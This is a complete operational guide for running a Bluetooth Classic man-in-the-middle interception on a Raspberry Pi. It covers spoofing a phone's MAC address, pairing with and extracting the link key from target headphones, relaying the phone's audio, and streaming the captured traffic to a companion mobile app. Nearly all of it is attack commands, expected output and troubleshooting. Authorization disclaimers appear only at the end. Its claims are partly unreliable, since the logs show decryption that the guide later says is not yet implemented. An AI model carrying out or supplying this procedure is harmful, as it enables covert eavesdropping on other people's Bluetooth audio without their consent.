# Integration Guide: Complete Setup

This guide walks you through setting up the complete Bluetooth MITM interceptor system from scratch.

## Part 1: Raspberry Pi Hardware Setup

### Required Hardware

1. **Raspberry Pi 3B+/4** (or newer)
2. **MicroSD Card** (16GB+ recommended)
3. **Power Supply** (Official recommended)
4. **Optional:** External Bluetooth USB dongle for better range/injection

### OS Installation

1. Download Raspberry Pi OS (Lite or Desktop)
2. Flash to SD card using Raspberry Pi Imager
3. Enable SSH (create empty `ssh` file in boot partition)
4. Configure WiFi (optional: `wpa_supplicant.conf`)
5. Boot and SSH into Pi

## Part 2: Raspberry Pi Software Setup

### System Update

```bash
sudo apt-get update
sudo apt-get upgrade -y
```

### Install Build Tools

```bash
sudo apt-get install -y \
    build-essential \
    libbluetooth-dev \
    bluetooth \
    bluez \
    bluez-tools \
    git
```

### Optional: Install MAC Spoofing Tool

```bash
# Install bdaddr for MAC spoofing
git clone https://github.com/thxomas/bdaddr.git
cd bdaddr
make
sudo make install
cd ..
```

### Build Interceptor

```bash
# Navigate to interceptor directory
cd /path/to/Bluetooth/interceptor

# Build the application
make

# Test it compiled correctly
./bt_interceptor -h

# Optional: Install system-wide
sudo make install
```

## Part 3: Mobile App Setup

### Development Environment

#### For Android:

1. Install Node.js 16+ and npm
2. Install Android Studio
3. Configure Android SDK (API 33+)
4. Set up Android emulator or connect physical device

#### For iOS:

1. Install Node.js 16+ and npm
2. Install Xcode (macOS only)
3. Install CocoaPods: `sudo gem install cocoapods`
4. Configure iOS simulator or connect physical device

### Install Dependencies

```bash
cd /path/to/Bluetooth/app
npm install
```

### Platform-Specific Setup

#### Android:

```bash
# Run on connected device or emulator
npx react-native run-android
```

#### iOS:

```bash
# Install iOS dependencies
cd ios
pod install
cd ..

# Run on simulator or device
npx react-native run-ios
```

## Part 4: Network Configuration

### Find Raspberry Pi IP Address

On the Pi:
```bash
hostname -I
# Example output: 192.168.1.100
```

### Ensure Same Network

- Pi and mobile device must be on same network
- For testing, use same WiFi network
- Note the Pi's IP address for later

### Open Firewall Port (if enabled)

```bash
# Check if firewall is active
sudo ufw status

# If active, allow TCP port 8888
sudo ufw allow 8888/tcp
```

## Part 5: Bluetooth Device Preparation

### Identify MAC Addresses

#### Find Source Device MAC (Phone):

**Android:**
```
Settings → About Phone → Status → Bluetooth Address
```

**iOS:**
```
Settings → General → About → Bluetooth
```

#### Find Target Device MAC (Headphones):

On Raspberry Pi:
```bash
sudo bluetoothctl
scan on
# Wait for your headphones to appear
# Note the MAC address (e.g., 11:22:33:44:55:66)
scan off
exit
```

### Prepare Devices

1. **Unpair** headphones from phone (if previously paired)
2. Put headphones in **pairing mode**
3. Keep source phone nearby but **not** connected to headphones

## Part 6: Running the Attack

### Step 1: Start Interceptor

On Raspberry Pi:
```bash
sudo ./bt_interceptor -s AA:BB:CC:DD:EE:FF -t 11:22:33:44:55:66 -P 8888
```

Replace:
- `AA:BB:CC:DD:EE:FF` with source device MAC (phone)
- `11:22:33:44:55:66` with target device MAC (headphones)

Expected output:
```
[INFO] Bluetooth MITM Interceptor
[INFO] Source (phone): AA:BB:CC:DD:EE:FF
[INFO] Target (headset): 11:22:33:44:55:66
[INFO] PSM: 25
[INFO] TCP Port: 8888
[INFO] Adapter address: XX:XX:XX:XX:XX:XX
[INFO] Step 1: Spoofing MAC address...
```

### Step 2: Pair with Target Device

When prompted, open another terminal and pair:

```bash
sudo bluetoothctl
scan on
# Wait for target device to appear
pair 11:22:33:44:55:66
trust 11:22:33:44:55:66
connect 11:22:33:44:55:66
# Should see "Connected" or "Paired"
exit
```

Return to interceptor terminal and press Enter.

Expected output:
```
[INFO] Link key extracted: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[INFO] Step 3: Creating TCP server
[INFO] TCP server listening on port 8888
[INFO] Step 4: Setting up Bluetooth relay
[INFO] Waiting for phone to connect...
```

### Step 3: Connect Mobile App

1. Launch the mobile app
2. Enter Pi IP address (e.g., `192.168.1.100`)
3. Enter port (e.g., `8888`)
4. Tap **"Connect"**

Expected app behavior:
- Connection status → "Connected"
- Statistics start updating
- Data packets being received

### Step 4: Connect Source Device

On your phone:
1. Go to Bluetooth settings
2. Connect to "headphones" (actually connecting to Pi)
3. Play audio on phone

Expected interceptor output:
```
[INFO] Phone connected: XX:XX:XX:XX:XX:XX
[INFO] Connecting to headset...
[INFO] Connected to headset
[INFO] MITM relay established - intercepting traffic
[DEBUG] Received 1024 bytes from phone
[DEBUG] Decrypting 1024 bytes...
```

### Step 5: Monitor Stream

On mobile app:
- Watch statistics update in real-time
- See data received counter increasing
- Buffer size should grow then stabilize

## Part 7: Verification

### Successful Attack Indicators

✅ **On Raspberry Pi:**
- "MITM relay established" message
- Regular debug messages showing data flow
- No error messages

✅ **On Mobile App:**
- Connection status: "Connected"
- Packets received counter increasing
- Bytes received growing steadily
- Last packet time updating (< 1 second ago)

✅ **On Phone:**
- Shows connected to headphones
- Audio playing

✅ **On Headphones:**
- Audio actually playing (relayed from Pi)
- Connected indicator light on

### Troubleshooting

**Problem:** MAC spoofing fails

**Solution:**
```bash
# Try manual spoofing
sudo hciconfig hci0 down
sudo bdaddr -i hci0 AA:BB:CC:DD:EE:FF
sudo hciconfig hci0 up
# Restart interceptor
```

---

**Problem:** Can't extract link key

**Solution:**
```bash
# Check if pairing created the file
ls -la /var/lib/bluetooth/*/11:22:33:44:55:66/info
# If not found, repeat pairing
sudo bluetoothctl
remove 11:22:33:44:55:66
pair 11:22:33:44:55:66
```

---

**Problem:** Phone won't connect

**Solution:**
- Ensure phone's Bluetooth is on
- Unpair headphones from phone first
- Restart Pi's Bluetooth: `sudo systemctl restart bluetooth`

---

**Problem:** Mobile app can't connect

**Solution:**
```bash
# Verify TCP server is listening
sudo netstat -tlnp | grep 8888
# Check firewall
sudo ufw status
# Ping test
ping <pi_ip_address>
```

---

**Problem:** No audio at headphones

**Solution:**
- Check both sockets are connected (Pi logs)
- Verify audio actually playing on phone
- Try different audio app on phone

## Part 8: Audio Decoding (Optional Enhancement)

### Option A: Server-Side Decoding (Easier)

Modify the C application to decode SBC before streaming:

1. Install SBC decoder library:
```bash
sudo apt-get install libsbc-dev
```

2. Update `Makefile`:
```makefile
LDFLAGS = -lbluetooth -lsbc
```

3. Update `crypto.c` to decode SBC → PCM

4. Mobile app receives raw PCM (easier to play)

### Option B: Client-Side Decoding (Better performance)

1. Implement native module on Android/iOS
2. Use platform's native SBC decoder
3. More efficient, lower latency

## Part 9: Clean Shutdown

### Stop Interceptor

Press `Ctrl+C` in the Pi terminal:
```
[INFO] Received signal 2, shutting down...
[INFO] Cleaning up...
[INFO] Shutdown complete
```

### Disconnect App

Tap "Disconnect" button in mobile app

### Reset Devices

On Raspberry Pi:
```bash
# Reset Bluetooth adapter
sudo hciconfig hci0 reset

# Restore original MAC (if spoofed)
sudo hciconfig hci0 down
sudo bdaddr -i hci0 <original_mac>
sudo hciconfig hci0 up
```

On Phone:
- Forget/unpair headphones
- Re-pair normally for regular use

## Part 10: Security Best Practices

### For Testing

- ✅ Only test on devices you own
- ✅ Get written permission for penetration testing
- ✅ Test in isolated environment
- ✅ Document all testing activities
- ✅ Reset devices after testing

### For Research

- ✅ Follow responsible disclosure
- ✅ Comply with ethics guidelines
- ✅ Obtain IRB approval if required
- ✅ Respect privacy laws

### Never

- ❌ Intercept communications without authorization
- ❌ Deploy in public spaces
- ❌ Use for malicious purposes
- ❌ Share captured audio/data

## Conclusion

You now have a complete Bluetooth MITM system for educational and authorized security research. Remember:

1. **Legal compliance** is your responsibility
2. **Authorization** is required before testing
3. **Ethical use** is mandatory

This system demonstrates real security vulnerabilities in Bluetooth Classic. Use it responsibly to improve security, not compromise it.

## Next Steps

- Implement E0 cipher for actual decryption
- Add SBC decoder for audio playback
- Explore advanced features (packet logging, analysis)
- Study Bluetooth security countermeasures
- Research Bluetooth LE security

Happy (ethical) hacking! 🔐
